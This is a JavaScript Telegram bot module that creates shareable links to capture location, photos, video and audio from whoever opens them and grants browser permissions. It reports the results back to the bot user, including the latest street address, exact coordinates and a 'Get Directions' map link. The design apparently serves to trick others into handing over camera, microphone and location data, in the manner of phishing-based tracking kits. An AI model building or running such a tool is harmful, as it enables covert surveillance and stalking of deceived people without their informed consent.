/**
 * ============================================
 * Telegram Bot Module
 * ============================================
 * Main bot logic with command and message handlers.
 */

const { Telegraf } = require('telegraf');
const config = require('./config');
const logger = require('./logger');
const api = require('./api');
const { 
    mainMenuKeyboard, 
    getPermissionTypeFromButton, 
    sessionActionsKeyboard 
} = require('./keyboard');

// Create bot instance
const bot = new Telegraf(config.botToken);

// Store active sessions for status updates (in-memory)
const activeSessions = new Map();

// ============================================
// Middleware
// ============================================

// Log all updates
bot.use((ctx, next) => {
    const user = ctx.from;
    logger.debug('Update received', {
        type: ctx.updateType,
        userId: user?.id,
        username: user?.username
    });
    return next();
});

// ============================================
// Command Handlers
// ============================================

/**
 * /start command - Initialize bot and show main menu
 */
bot.start(async (ctx) => {
    const user = ctx.from;
    
    logger.info('User started bot', {
        userId: user.id,
        username: user.username
    });
    
    await ctx.reply(
        `👋 Welcome, ${user.first_name || 'User'}!\n\n` +
        `I can help you create permission sessions for:\n` +
        `📍 Location tracking\n` +
        `📷 Photo capture\n` +
        `🎥 Video recording\n` +
        `🎤 Audio recording\n\n` +
        `Select an option from the menu below to get started.`,
        mainMenuKeyboard
    );
});

/**
 * /help command - Show help message
 */
bot.help(async (ctx) => {
    await ctx.reply(
        `ℹ️ *How to use this bot:*\n\n` +
        `1️⃣ Select a permission type from the menu\n` +
        `2️⃣ Receive a unique link\n` +
        `3️⃣ Open the link in your browser\n` +
        `4️⃣ Grant permissions when prompted\n` +
        `5️⃣ Data will be captured and stored\n\n` +
        `*Available permissions:*\n` +
        `📍 Location - Track GPS coordinates\n` +
        `📷 Single Photo - Capture one photo\n` +
        `📸 Continuous Photo - Take photos periodically\n` +
        `🎥 Video - Record video\n` +
        `🎤 Microphone - Record audio\n\n` +
        `*Commands:*\n` +
        `/start - Show main menu\n` +
        `/help - Show this help message\n` +
        `/status - Check API status`,
        { parse_mode: 'Markdown' }
    );
});

/**
 * /status command - Check API health
 */
bot.command('status', async (ctx) => {
    const isHealthy = await api.checkHealth();
    
    await ctx.reply(
        isHealthy
            ? '✅ Backend API is online and healthy'
            : '❌ Backend API is offline or unhealthy'
    );
});

// ============================================
// Message Handlers
// ============================================

/**
 * Handle permission button presses
 */
bot.on('text', async (ctx) => {
    const buttonText = ctx.message.text;
    const permissionType = getPermissionTypeFromButton(buttonText);
    
    if (!permissionType) {
        // Not a menu button, ignore or show help
        await ctx.reply(
            '🤔 I don\'t understand that message.\n' +
            'Please use the menu buttons below or type /help for assistance.'
        );
        return;
    }
    
    const user = ctx.from;
    const permissionConfig = config.permissions[permissionType];
    
    logger.info('Permission requested', {
        userId: user.id,
        permissionType
    });
    
    // Show processing message
    const processingMsg = await ctx.reply('⏳ Creating session...');
    
    try {
        // Create session via API
        const result = await api.createSession(user, permissionType);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to create session');
        }
        
        const { session } = result;
        
        // Store session for tracking
        activeSessions.set(session.id, {
            chatId: ctx.chat.id,
            userId: user.id,
            permissionType,
            createdAt: new Date()
        });
        
        // Delete processing message
        await ctx.deleteMessage(processingMsg.message_id).catch(() => {});
        
        // Send session link
        await ctx.reply(
            `✅ *Session Created!*\n\n` +
            `*Type:* ${permissionConfig.label}\n` +
            `*Description:* ${permissionConfig.description}\n\n` +
            `🔗 *Click the link below to start:*\n` +
            `${session.webLink}\n\n` +
            `⏰ *Expires:* ${new Date(session.expiresAt).toLocaleString()}\n\n` +
            `_The link will open in your browser where you can grant the required permissions._`,
            {
                parse_mode: 'Markdown',
                disable_web_page_preview: true,
                ...sessionActionsKeyboard(session.id)
            }
        );
        
        logger.info('Session created successfully', {
            sessionId: session.id,
            userId: user.id,
            permissionType
        });
        
    } catch (error) {
        logger.error('Failed to create session', {
            userId: user.id,
            error: error.message
        });
        
        // Delete processing message
        await ctx.deleteMessage(processingMsg.message_id).catch(() => {});
        
        await ctx.reply(
            '❌ Failed to create session.\n\n' +
            'Please make sure the backend server is running and try again.\n' +
            'Error: ' + error.message
        );
    }
});

// ============================================
// Callback Query Handlers
// ============================================

/**
 * Handle session status check
 */
bot.action(/^status_(.+)$/, async (ctx) => {
    const sessionId = ctx.match[1];
    
    await ctx.answerCbQuery('Checking status...');
    
    try {
        const result = await api.getSession(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Session not found');
        }
        
        const { session } = result;
        
        const statusEmoji = {
            created: '🟡',
            active: '🟢',
            ended: '⚫',
            expired: '🔴'
        };
        
        let mediaInfo = '';
        if (session.mediaCounts && Object.keys(session.mediaCounts).length > 0) {
            mediaInfo = '\n\n📊 <b>Data Received:</b>\n';
            for (const [type, count] of Object.entries(session.mediaCounts)) {
                mediaInfo += `  • ${type}: ${count}\n`;
            }
        }
        
        // Build status message
        let statusMessage = 
            `📋 <b>Session Status</b>\n\n` +
            `<b>Status:</b> ${statusEmoji[session.status] || '⚪'} ${session.status.toUpperCase()}\n` +
            `<b>Type:</b> ${config.permissions[session.permissionType]?.label || session.permissionType}\n` +
            `<b>Created:</b> ${new Date(session.createdAt).toLocaleString()}\n` +
            `<b>Expires:</b> ${new Date(session.expiresAt).toLocaleString()}` +
            (session.activatedAt ? `\n<b>Activated:</b> ${new Date(session.activatedAt).toLocaleString()}` : '') +
            (session.endedAt ? `\n<b>Ended:</b> ${new Date(session.endedAt).toLocaleString()}` : '') +
            mediaInfo;
        
        await ctx.reply(statusMessage, { parse_mode: 'HTML' });
        
        // If it's a location session, also show the last location with full details
        if (session.permissionType === 'location' && session.mediaCounts?.location > 0) {
            try {
                const locationsResult = await api.getSessionLocations(sessionId);
                
                if (locationsResult.success && locationsResult.locations.length > 0) {
                    // Get the most recent location
                    const latestLocation = locationsResult.locations[locationsResult.locations.length - 1];
                    const loc = latestLocation.data;
                    
                    let locationMessage = `\n📍 <b>LATEST LOCATION</b>\n\n`;
                    
                    // Address
                    if (loc.address) {
                        locationMessage += `📌 <b>Address:</b>\n${loc.address.formatted || loc.address.displayName}\n\n`;
                        
                        if (loc.address.street) locationMessage += `🏠 Street: ${loc.address.street}\n`;
                        if (loc.address.neighborhood) locationMessage += `🏘️ Area: ${loc.address.neighborhood}\n`;
                        if (loc.address.city) locationMessage += `🌆 City: ${loc.address.city}\n`;
                        if (loc.address.state) locationMessage += `🗺️ State: ${loc.address.state}\n`;
                        if (loc.address.country) locationMessage += `🌍 Country: ${loc.address.country}\n`;
                        if (loc.address.postalCode) locationMessage += `📮 Postal: ${loc.address.postalCode}\n`;
                        locationMessage += `\n`;
                    }
                    
                    // Coordinates
                    if (loc.coordinates) {
                        locationMessage += `🎯 <b>Coordinates:</b>\n`;
                        locationMessage += `├ Lat: <code>${loc.coordinates.latitude?.toFixed(6)}</code>\n`;
                        locationMessage += `├ Lng: <code>${loc.coordinates.longitude?.toFixed(6)}</code>\n`;
                        if (loc.coordinates.accuracy) locationMessage += `├ Accuracy: ${loc.coordinates.accuracy.toFixed(1)}m\n`;
                        locationMessage += `\n`;
                    }
                    
                    // Timestamp
                    locationMessage += `🕐 <b>Captured:</b> ${new Date(latestLocation.timestamp).toLocaleString()}\n\n`;
                    
                    // Maps links
                    if (loc.maps) {
                        locationMessage += `🗺️ <b>View on Maps:</b>\n`;
                        locationMessage += `<a href="${loc.maps.googleMaps}">📍 Open in Google Maps</a>\n`;
                        locationMessage += `<a href="${loc.maps.googleMapsDirections}">🧭 Get Directions</a>`;
                    }
                    
                    await ctx.reply(locationMessage, { 
                        parse_mode: 'HTML',
                        disable_web_page_preview: false
                    });
                }
            } catch (locError) {
                logger.error('Failed to get locations', { error: locError.message });
            }
        }
        
    } catch (error) {
        logger.error('Failed to get session status', {
            sessionId,
            error: error.message
        });
        
        await ctx.reply('❌ Failed to get session status: ' + error.message);
    }
});

/**
 * Handle session end request
 */
bot.action(/^end_(.+)$/, async (ctx) => {
    const sessionId = ctx.match[1];
    
    await ctx.answerCbQuery('Ending session...');
    
    try {
        const result = await api.endSession(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to end session');
        }
        
        // Remove from active sessions
        activeSessions.delete(sessionId);
        
        await ctx.reply(
            '✅ Session ended successfully.\n\n' +
            'No more data will be accepted for this session.'
        );
        
        logger.info('Session ended by user', { sessionId });
        
    } catch (error) {
        logger.error('Failed to end session', {
            sessionId,
            error: error.message
        });
        
        await ctx.reply('❌ Failed to end session: ' + error.message);
    }
});

// ============================================
// Error Handling
// ============================================

bot.catch((err, ctx) => {
    logger.error('Bot error', {
        error: err.message,
        updateType: ctx.updateType
    });
});

// ============================================
// Exports
// ============================================

module.exports = bot;
